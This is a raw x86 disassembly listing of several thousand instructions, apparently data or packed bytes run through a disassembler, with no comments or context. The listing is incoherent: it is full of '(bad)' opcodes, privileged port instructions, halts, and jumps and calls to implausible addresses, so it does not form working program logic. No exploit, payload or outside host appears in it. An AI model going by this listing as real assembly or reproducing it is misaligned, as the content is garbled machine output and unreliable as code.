  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
